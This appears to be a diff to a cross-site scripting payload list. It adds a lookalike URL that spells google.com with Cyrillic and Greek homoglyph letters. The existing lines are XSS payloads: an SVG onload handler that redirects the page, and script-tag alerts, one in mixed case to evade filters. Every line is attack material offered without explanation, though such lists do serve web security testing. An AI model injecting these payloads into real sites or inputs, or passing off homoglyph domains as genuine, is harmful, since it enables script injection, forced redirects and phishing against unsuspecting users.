@@ -1,3 +1,4 @@
+https://gоοgle.ϲom
 <svg/onload=prompt(window.location="https://google.com")>
 <script>alert(123);</script>
 <ScRipT>alert("XSS");</ScRipT>
